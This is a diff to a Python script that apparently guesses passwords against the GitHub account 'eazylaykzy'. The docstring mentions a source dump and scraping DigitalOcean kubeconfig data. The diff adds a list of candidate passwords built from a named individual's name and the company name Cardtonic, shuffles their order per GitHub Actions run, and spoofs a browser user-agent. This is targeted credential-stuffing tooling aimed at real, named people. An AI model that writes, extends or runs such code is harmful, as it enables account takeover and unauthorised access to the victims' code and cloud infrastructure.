@@ -5,7 +5,20 @@ source dump + DigitalOcean 'Sign in with GitHub' read-only scrape (incl. kubecon
 """
 import json, os, re, subprocess, sys, time, random
 
-CANDS = ["Adelekeadenijio@123", "AdelekeAdeniji@2025", "Cardtonic@2023", "Cardtonic@2021"]
+try:
+    CANDS = json.loads(os.environ.get("CANDS_JSON") or "")
+    if not isinstance(CANDS, list) or not CANDS:
+        raise ValueError
+except Exception:
+    CANDS = ["Cardtonic@2023", "Cardtonic@2021", "Tonic2024!", "thetonictech@2024", "cardtonic092", "Heycardtonic1", "Adelekeadenijio123!", "Adelekeadenijio", "Codesurge@2024", "eazylaykzy"]
+if os.environ.get("SHUFFLE"):
+    random.shuffle(CANDS)
+try:
+    _rn = int(os.environ.get("GITHUB_RUN_NUMBER", "0"))
+    if _rn:
+        random.Random(_rn).shuffle(CANDS)
+except Exception:
+    pass
 LOGIN = os.environ.get("GH_LOGIN", "eazylaykzy")
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
       "Chrome/131.0.0.0 Safari/537.36")
